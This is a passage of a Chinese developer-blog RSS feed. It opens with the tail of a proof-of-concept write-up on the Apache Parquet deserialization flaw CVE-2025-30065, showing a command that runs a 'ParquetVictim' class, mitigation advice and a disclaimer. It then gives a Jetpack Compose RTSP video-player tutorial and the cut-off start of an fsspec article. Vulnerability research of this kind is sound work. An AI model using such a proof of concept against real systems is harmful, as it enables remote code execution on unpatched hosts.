java -<span class="hljs-built_in">cp</span> <span class="hljs-string">".:<span class="hljs-variable">$BUILD_DIR</span>:<span class="hljs-variable">$JAR_DEPS</span>"</span> ParquetVictim
</code></pre>
<h3 data-id="heading-12">安全建议与缓解措施</h3>
<ol>
<li><strong>立即更新</strong>：将 Apache Parquet Java 库升级至 <strong>1.15.1 或更高版本</strong>。</li>
<li><strong>启用类允许列表</strong>：
<ul>
<li>配置 <code>org.apache.parquet.avro.SERIALIZABLE_PACKAGES</code>，仅允许受信任的包（避免使用 <code>*</code>）。</li>
<li>使用 <code>org.apache.avro.TRUSTED_PACKAGES</code> 来限制Avro模式行为。</li>
</ul>
</li>
<li><strong>来源控制</strong>：避免处理来自不可信来源的Parquet文件，或对文件进行安全扫描。</li>
</ol>
<h3 data-id="heading-13">免责声明</h3>
<blockquote>
<p>本项目内容仅供<strong>教育研究及安全意识提升</strong>之目的，旨在揭示Apache Parquet中<strong>CVE-2025-30065</strong>安全漏洞的原理。<strong>任何信息均不鼓励或支持恶意活动、未经授权的系统访问或漏洞利用</strong>。
请确保您拥有测试目标系统的授权，并遵循负责任的披露流程及法律边界。作者不对信息的任何误用负责。FINISHED
6HFtX5dABrKlqXeO5PUv/84SoIo+TE3firf/5vX8AZ4lCdOI9nDKouWcoabNKkPM</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android中compose框架应用实践]]></title>    <link>https://juejin.cn/post/7602176198874857515</link>    <guid>https://juejin.cn/post/7602176198874857515</guid>    <pubDate>2026-02-03T05:38:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602176198874857515" data-draft-id="7602252722372689971" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android中compose框架应用实践"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-02-03T05:38:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="岸芷漫步"/> <meta itemprop="url" content="https://juejin.cn/user/2294042692432848"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android中compose框架应用实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2294042692432848/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    岸芷漫步
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T05:38:50.000Z" title="Tue Feb 03 2026 05:38:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在android中，compose作为声明式UI框架有着广泛的应用。其典型范式包括诸如声明式UI描述页面结构、响应式状态作为UI唯一驱动、带参remember实现高开销实例的懒加载与重建、LaunchedEffect/DisposableEffect处理副作用函数用于处理非UI逻辑和资源管理、AndroidView实现与原生视图的无缝集成、组合式组件实现代码复用与扩展。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 在build.gradle中的dependencies中添加依赖</span>
implementation <span class="hljs-string">'org.videolan.android:libvlc-all:3.6.0'</span>

<span class="hljs-keyword">package</span> com.eric.video

<span class="hljs-keyword">import</span> android.net.Uri
<span class="hljs-keyword">import</span> android.os.Bundle
<span class="hljs-keyword">import</span> android.util.Log
<span class="hljs-keyword">import</span> android.view.TextureView
<span class="hljs-keyword">import</span> android.view.ViewGroup
<span class="hljs-keyword">import</span> android.widget.Toast
<span class="hljs-keyword">import</span> androidx.activity.ComponentActivity
<span class="hljs-keyword">import</span> androidx.activity.compose.setContent
<span class="hljs-keyword">import</span> androidx.activity.enableEdgeToEdge
<span class="hljs-keyword">import</span> androidx.compose.foundation.background
<span class="hljs-keyword">import</span> androidx.compose.foundation.layout.Arrangement
<span class="hljs-keyword">import</span> androidx.compose.foundation.layout.Column
<span class="hljs-keyword">import</span> androidx.compose.foundation.layout.fillMaxSize
<span class="hljs-keyword">import</span> androidx.compose.foundation.layout.fillMaxWidth
<span class="hljs-keyword">import</span> androidx.compose.foundation.layout.padding
<span class="hljs-keyword">import</span> androidx.compose.foundation.shape.RoundedCornerShape
<span class="hljs-keyword">import</span> androidx.compose.foundation.text.KeyboardActions
<span class="hljs-keyword">import</span> androidx.compose.foundation.text.KeyboardOptions
<span class="hljs-keyword">import</span> androidx.compose.material.icons.Icons
<span class="hljs-keyword">import</span> androidx.compose.material.icons.filled.ArrowBack
<span class="hljs-keyword">import</span> androidx.compose.material3.ExperimentalMaterial3Api
<span class="hljs-keyword">import</span> androidx.compose.material3.Icon
<span class="hljs-keyword">import</span> androidx.compose.material3.IconButton
<span class="hljs-keyword">import</span> androidx.compose.material3.OutlinedTextField
<span class="hljs-keyword">import</span> androidx.compose.material3.Scaffold
<span class="hljs-keyword">import</span> androidx.compose.material3.Text
<span class="hljs-keyword">import</span> androidx.compose.material3.TopAppBar
<span class="hljs-keyword">import</span> androidx.compose.material3.TopAppBarDefaults
<span class="hljs-keyword">import</span> androidx.compose.runtime.Composable
<span class="hljs-keyword">import</span> androidx.compose.runtime.DisposableEffect
<span class="hljs-keyword">import</span> androidx.compose.runtime.LaunchedEffect
<span class="hljs-keyword">import</span> androidx.compose.runtime.getValue
<span class="hljs-keyword">import</span> androidx.compose.runtime.mutableStateOf
<span class="hljs-keyword">import</span> androidx.compose.runtime.remember
<span class="hljs-keyword">import</span> androidx.compose.runtime.setValue
<span class="hljs-keyword">import</span> androidx.compose.ui.Modifier
<span class="hljs-keyword">import</span> androidx.compose.ui.graphics.Color
<span class="hljs-keyword">import</span> androidx.compose.ui.platform.LocalContext
<span class="hljs-keyword">import</span> androidx.compose.ui.text.input.ImeAction
<span class="hljs-keyword">import</span> androidx.compose.ui.tooling.preview.Preview
<span class="hljs-keyword">import</span> androidx.compose.ui.unit.dp
<span class="hljs-keyword">import</span> androidx.compose.ui.viewinterop.AndroidView
<span class="hljs-keyword">import</span> com.eric.video.EricActivity.Companion.TAG
<span class="hljs-keyword">import</span> com.eric.video.ui.theme.VideoTheme
<span class="hljs-keyword">import</span> kotlinx.coroutines.delay
<span class="hljs-keyword">import</span> org.videolan.libvlc.LibVLC
<span class="hljs-keyword">import</span> org.videolan.libvlc.Media
<span class="hljs-keyword">import</span> org.videolan.libvlc.MediaPlayer
<span class="hljs-keyword">import</span> org.videolan.libvlc.util.VLCVideoLayout


<span class="hljs-keyword">class</span> <span class="hljs-title class_">EricActivity</span> : <span class="hljs-type">ComponentActivity</span>() {
    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-comment">// RTSP（Real-Time Streaming Protocol，实时流传输协议）的地址属于专用 URL，核心用于音视频实时流的拉取 / 推送，其通用基础格式为：</span>
        <span class="hljs-comment">// rtsp://[用户名:密码@]设备/服务器IP[:端口号]/流媒体资源路径</span>
        <span class="hljs-comment">// 554：RTSP 协议的国际标准默认端口号（由 IANA 分配）</span>
        <span class="hljs-keyword">const</span> <span class="hljs-keyword">val</span> VIDEO_RTSP_URL = <span class="hljs-string">"rtsp://eirc:eric666@192.168.0.190:554/LiveMedia/ch1/Media1"</span>
        <span class="hljs-keyword">const</span> <span class="hljs-keyword">val</span> PARAM_KEY = <span class="hljs-string">"param_key"</span>
        <span class="hljs-keyword">const</span> <span class="hljs-keyword">val</span> TAG = <span class="hljs-string">"Eric-RTSP"</span>
    }

    <span class="hljs-keyword">var</span> playedRtspUrl = VIDEO_RTSP_URL

    <span class="hljs-meta">@OptIn(ExperimentalMaterial3Api::class)</span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(savedInstanceState: <span class="hljs-type">Bundle</span>?)</span></span> {
        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState)
        enableEdgeToEdge()
        <span class="hljs-keyword">val</span> recvRtspUrl = intent?.getStringExtra(PARAM_KEY)
        Log.d(TAG, <span class="hljs-string">"onCreate,recvRtspUrl:<span class="hljs-variable">$recvRtspUrl</span>"</span>)
        playedRtspUrl = <span class="hljs-keyword">if</span> (!recvRtspUrl.isNullOrEmpty() &amp;&amp; recvRtspUrl.startsWith(<span class="hljs-string">"rtsp://"</span>)) {
            recvRtspUrl
        } <span class="hljs-keyword">else</span> {
            VIDEO_RTSP_URL
        }
        Log.d(TAG, <span class="hljs-string">"onCreate,playedRtspUrl:<span class="hljs-variable">$playedRtspUrl</span>"</span>)
        <span class="hljs-comment">// Compose 摒弃了传统 Android 的 “视图继承体系”，采用组合式组件开发：将复杂 UI 拆分为多个独立的、可复用的小组件，通过组合的方式搭建复杂 UI，而非通过继承扩展组件功能。</span>
        <span class="hljs-comment">// 整个页面由Scaffold（页面骨架）、TopAppBar（顶部栏）、EricRtspPlayer（核心播放器）、OutlinedTextField（输入框）等组件组合而成，每个组件职责单一.</span>
        <span class="hljs-comment">// 在onCreate中通过 setContent 初始化 Compose 根布局，使用 Material3 的Scaffold+TopAppBar搭建基础页面结构；</span>
        setContent {
            VideoTheme {
                Scaffold(
                    modifier = Modifier.fillMaxSize(),
                    topBar = {
                        TopAppBar(
                            title = { Text(<span class="hljs-string">"Video surface"</span>) },
                            navigationIcon = {
                                IconButton(onClick = {
                                    finish()
                                }) {
                                    Icon(
                                        imageVector = Icons.Filled.ArrowBack,
                                        contentDescription = <span class="hljs-string">"back"</span>,
                                        tint = Color.White
                                    )
                                }
                            },
                            colors = TopAppBarDefaults.topAppBarColors(
                                containerColor = Color(<span class="hljs-number">0xFF027EFB</span>),
                                titleContentColor = Color.White,
                                navigationIconContentColor = Color.White
                            )
                        )
                    }
                ) {
                    innerPadding -&gt;
                    EricRtspPlayer(
                        modifier = Modifier.fillMaxSize().padding(innerPadding),
                        rtspUrl = playedRtspUrl
                    )
                }
            }
        }
    }

}

<span class="hljs-meta">@Preview(showBackground = true)</span>
<span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">RtspPlayerPreview</span><span class="hljs-params">()</span></span> {
    VideoTheme {
        EricRtspPlayer(rtspUrl = EricActivity.Companion.VIDEO_RTSP_URL)
    }
}

<span class="hljs-comment">// EricRtspPlayer 是独立的可组合函数，可在任意 Compose 布局中复用，只需传递rtspUrl和modifier参数;可以复用组件。</span>
<span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">EricRtspPlayer</span><span class="hljs-params">(modifier: <span class="hljs-type">Modifier</span> = Modifier, rtspUrl: <span class="hljs-type">String</span>)</span></span> {
    <span class="hljs-keyword">val</span> context = LocalContext.current
    <span class="hljs-comment">// remember是 Compose 的状态缓存函数，用于在组件重组时保留数据/实例，避免重复创建（如复杂对象、原生实例、网络请求结果）。</span>
    <span class="hljs-comment">// 无参remember：仅在组件首次创建时执行，后续重组复用结果（如remember { mutableStateOf(rtspUrl) }）;</span>
    <span class="hljs-comment">// 带参remember：仅在依赖的参数变化时执行，否则复用结果（如remember(inputRtspUrl) { LibVLC(...) }）;</span>
    <span class="hljs-comment">// remember 保留状态在组件重组时不被重新初始化，保证状态的连续性。</span>
    <span class="hljs-comment">// 作用：该状态是整个播放器的唯一数据源，鸿蒙传递的初始地址、手动编辑的地址都通过该状态管理，实现 “一处修改，全局更新”。</span>
    <span class="hljs-comment">// Compose 的核心设计：UI = f (状态)，UI 是状态的函数，状态变化自动触发 UI 重组，更新为对应状态的 UI，无需手动调用notifyDataSetChanged、invalidate等方法。</span>
    <span class="hljs-keyword">var</span> inputRtspUrl <span class="hljs-keyword">by</span> remember {
        <span class="hljs-comment">// mutableStateOf 创建 Compose可观察状态，状态变化会自动触发 Compose 重组，更新关联的 UI 和业务逻辑.</span>
        mutableStateOf(rtspUrl)
    }
    <span class="hljs-comment">// 仅当inputRtspUrl变化时，重新创建LibVLC实例.</span>
    <span class="hljs-comment">// remember(inputRtspUrl)：带依赖参数的 remember，只有依赖的状态发生变化时，才会重新执行 Lambda 创建新实例，否则复用原有实例，避免不必要的性能开销.</span>
    <span class="hljs-comment">// 将 VLC 实例的创建与 RTSP 地址状态绑定，地址变化自动重建播放器实例，实现 “输入地址即实时刷新播放” 的核心需求.</span>
    <span class="hljs-keyword">val</span> libVlc = remember(inputRtspUrl) {
        <span class="hljs-keyword">val</span> vlcOptions = ArrayList&lt;String&gt;().apply {
            add(<span class="hljs-string">"--rtsp-tcp"</span>)
            add(<span class="hljs-string">"--avcodec-codec=h264"</span>)
            add(<span class="hljs-string">"--network-caching=200"</span>)
            add(<span class="hljs-string">"--no-drop-late-frames"</span>)
            add(<span class="hljs-string">"--no-skip-frames"</span>)
        }
        LibVLC(context, vlcOptions).also {
            Log.d(TAG, <span class="hljs-string">"LibVLC init success"</span>)
        }
    }
    <span class="hljs-comment">// 仅当inputRtspUrl/libVlc变化时，重新创建MediaPlayer实例</span>
    <span class="hljs-keyword">val</span> mediaPlayer = remember(inputRtspUrl,libVlc) {
        MediaPlayer(libVlc).also {
            player -&gt;
            <span class="hljs-keyword">try</span> {
                <span class="hljs-keyword">val</span> media = Media(libVlc, Uri.parse(inputRtspUrl,))
                player.media = media
                media.release()
                Log.d(TAG, <span class="hljs-string">"MediaPlayer init success and rtsp url is <span class="hljs-variable">$inputRtspUrl</span>,"</span>)
            } <span class="hljs-keyword">catch</span> (e: Exception) {
                Log.e(TAG, <span class="hljs-string">"Media init failed, url is <span class="hljs-variable">$inputRtspUrl</span>, error "</span>, e)
            }

        }
    }
    <span class="hljs-comment">// Compose 作为新的 UI 框架，无法完全替代现有 Android 的原生视图（如自定义 View、第三方原生控件、VLC 播放器），</span>
    <span class="hljs-comment">// 因此提供了 AndroidView 和 AndroidViewBinding 两个核心 API，实现Compose 与原生视图的无缝集成。</span>
    <span class="hljs-comment">// 通过AndroidView嵌入 VLC 的原生渲染视图VLCVideoLayout，实现 Compose 中无原生组件的视频渲染需求.</span>
    <span class="hljs-comment">// 核心作用：解决了 Compose 生态暂未覆盖的原生视图需求（如 VLC 播放器、自定义原生控件），是 Compose 与现有 Android 原生代码兼容的关键。</span>
    AndroidView(
        modifier = modifier.fillMaxSize().padding(bottom = <span class="hljs-number">450.</span>dp),
        <span class="hljs-comment">// factory：仅首次创建原生视图时执行，负责原生视图的初始化，避免重复创建.</span>
        factory = {
            ctx -&gt;
            <span class="hljs-comment">// 仅首次创建时执行：创建原生VLCVideoLayout</span>
            VLCVideoLayout(ctx).apply {
                layoutParams = ViewGroup.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT,
                    ViewGroup.LayoutParams.MATCH_PARENT
                )
                Log.d(TAG, <span class="hljs-string">"VLCVideoLayout create  success."</span>)
            }
        },
        <span class="hljs-comment">// update：Compose 重组/状态变化时执行，负责原生视图的更新（如绑定视频输出、修改属性），实现 Compose 状态与原生视图的联动.</span>
        update = {
            <span class="hljs-comment">// 组件重组/状态变化时执行：更新视图绑定</span>
            videoLayout -&gt;
            <span class="hljs-keyword">try</span> {
                <span class="hljs-keyword">val</span> vlcVout = mediaPlayer.vlcVout
                vlcVout.detachViews()
                videoLayout.removeAllViews()
                <span class="hljs-comment">// 绑定TextureView到VLC的视频输出，完成渲染视图初始化</span>
                <span class="hljs-keyword">val</span> textureView = TextureView(context)
                <span class="hljs-keyword">val</span> textureParams = ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)
                textureView.layoutParams = textureParams
                videoLayout.addView(textureView)
                vlcVout.setVideoView(textureView)
                vlcVout.attachViews()
                mediaPlayer.scale = <span class="hljs-number">0f</span>
                mediaPlayer.aspectRatio = <span class="hljs-string">"16:9"</span>
            } <span class="hljs-keyword">catch</span> (e: Exception) {
                Log.e(TAG, <span class="hljs-string">"draw view failed:"</span>, e)
            }
        }
    )

    Column(
        modifier = modifier.padding(top = <span class="hljs-number">300.</span>dp).background(Color.White),
        verticalArrangement = Arrangement.Top
    ) {
        inputRtspUrl?.let {
            <span class="hljs-comment">// OutlinedTextField是Compose 官方可编辑输入框.</span>
            OutlinedTextField(
                value = it, <span class="hljs-comment">// 绑定输入状态，即绑定可观察状态：UI展示状态值</span>
                onValueChange = {
                    newUrl -&gt;
                    <span class="hljs-keyword">if</span> (!newUrl.isNullOrEmpty() &amp;&amp; newUrl.startsWith(<span class="hljs-string">"rtsp://"</span>)) {
                        inputRtspUrl = newUrl
                    } <span class="hljs-keyword">else</span> {
                        Toast.makeText(context, <span class="hljs-string">"please input right RTSP address"</span>, Toast.LENGTH_SHORT).show()
                    }
                },
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(horizontal = <span class="hljs-number">16.</span>dp, vertical = <span class="hljs-number">8.</span>dp)
                    .background(Color.White, RoundedCornerShape(<span class="hljs-number">8.</span>dp)),
                label = { Text(<span class="hljs-string">"RTSP url"</span>) },
                placeholder = {
                    <span class="hljs-keyword">if</span> (rtspUrl != <span class="hljs-literal">null</span>) {
                        Text(rtspUrl)
                    }
                },
                keyboardOptions = KeyboardOptions(
                    imeAction = ImeAction.Done
                ),
                keyboardActions = KeyboardActions(
                    onDone = { }
                ),
                singleLine = <span class="hljs-literal">true</span>,
                maxLines = <span class="hljs-number">1</span>
            )
        }
    }
    <span class="hljs-comment">// Compose 是 Android 官方的声明式 UI 框架. Compose 中禁止在可组合函数中直接执行非 UI 逻辑（如延迟播放、资源释放、网络请求），需通过副作用函数处理.</span>
    <span class="hljs-comment">// Compose 提供了副作用函数，用于处理非 UI 逻辑，确保逻辑的执行时机可控、次数确定，本代码使用的LaunchedEffect、DisposableEffect是最常用的两个副作用函数.</span>
    <span class="hljs-comment">// 代码中使用了 2 个核心副作用函数LaunchedEffect和DisposableEffect。</span>
    <span class="hljs-comment">// LaunchedEffect：处理挂起函数与延迟逻辑。</span>
    <span class="hljs-comment">// LaunchedEffect内置 Kotlin 协程作用域，直接执行挂起函数，无需手动创建协程。</span>
    LaunchedEffect(mediaPlayer) {
        <span class="hljs-keyword">try</span> {
            delay(<span class="hljs-number">300</span>) <span class="hljs-comment">// 挂起函数，需在协程中执行</span>
            mediaPlayer.play()
            Log.d(TAG, <span class="hljs-string">"begin to play RTSP stream..."</span>)
        } <span class="hljs-keyword">catch</span> (e: Exception) {
            Log.e(TAG, <span class="hljs-string">"play failed,url is <span class="hljs-variable">$inputRtspUrl</span>,error:"</span>, e)
        }

    }
    <span class="hljs-comment">// DisposableEffect：处理资源释放</span>
    DisposableEffect(libVlc, mediaPlayer) {
        onDispose {
            Log.d(TAG, <span class="hljs-string">"release VLC resource..."</span>)
            mediaPlayer.vlcVout.detachViews()
            mediaPlayer.stop()
            mediaPlayer.release()
            libVlc.release()
        }
    }
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[一天一个Python库：fsspec - 统一文件系统接口，轻松访问数据]]></title>    <link>https://juejin.cn/post/7602154171109457983</link>    <guid>https://juejin.cn/post/7602154171109457983</guid>    <pubDate>2026-02-03T04:02:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602154171109457983" data-draft-id="7602201748229472275" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="一天一个Python库：fsspec - 统一文件系统接口，轻松访问数据"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-02-03T04:02:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="敏编程"/> <meta itemprop="url" content="https://juejin.cn/user/2579909358396288"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            一天一个Python库：fsspec - 统一文件系统接口，轻松访问数据
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2579909358396288/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    敏编程
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T04:02:18.000Z" title="Tue Feb 03 2026 04:02:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 